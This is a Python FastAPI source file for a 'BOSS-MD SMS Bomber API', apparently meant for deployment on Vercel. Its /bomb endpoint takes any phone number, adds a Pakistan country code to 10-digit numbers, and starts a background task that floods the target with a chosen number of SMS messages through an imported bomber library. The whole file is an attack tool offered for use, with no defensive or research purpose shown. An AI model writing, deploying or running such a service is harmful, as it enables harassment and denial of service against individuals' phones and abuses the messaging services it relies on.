from fastapi import FastAPI, BackgroundTasks
from typing import Optional
from smsbomber import Bomber
import asyncio

app = FastAPI()

@app.get("/")
async def home():
    return {
        "status": "BOSS-MD SMS Bomber API",
        "message": "Welcome to API :)",
        "version": "1.0",
        "platform": "Vercel"
    }

@app.get("/bomb")
async def bomb(background_tasks: BackgroundTasks, number: str, noOfMsg: Optional[int] = 50):
    # Validation - Pakistan numbers ke liye (10-12 digits)
    if number.isdigit() and (len(number) == 10 or len(number) == 11 or len(number) == 12):
        # Agar 10 digits hai to 92 laga do (Pakistan)
        if len(number) == 10:
            formatted_number = "92" + number
        else:
            formatted_number = number
            
        # Create bomber object
        bombobj = Bomber(formatted_number, noOfMsg)
        
        # Background task start karo
        background_tasks.add_task(run_bombing, bombobj)
        
        return {
            "status": "Sending",
            "number": formatted_number,
            "messages": noOfMsg,
            "message": f"Bombing started on +{formatted_number}"
        }
    else:
        return {
            "status": "Error",
            "message": "Check Your Entries - Number should be 10-12 digits",
            "example": "Use: 923001234567 or 03001234567"
        }

@app.get("/health")
async def health():
    return {"status": "healthy", "uptime": "always online"}

def run_bombing(bomber):
    """Run bombing in background with error handling"""
    try:
        print(f"Starting bombing on {bomber.user_mobile}")
        bomber.startBombing()
        print(f"Bombing completed on {bomber.user_mobile}")
    except Exception as e:
        print(f"Error in bombing: {str(e)}")
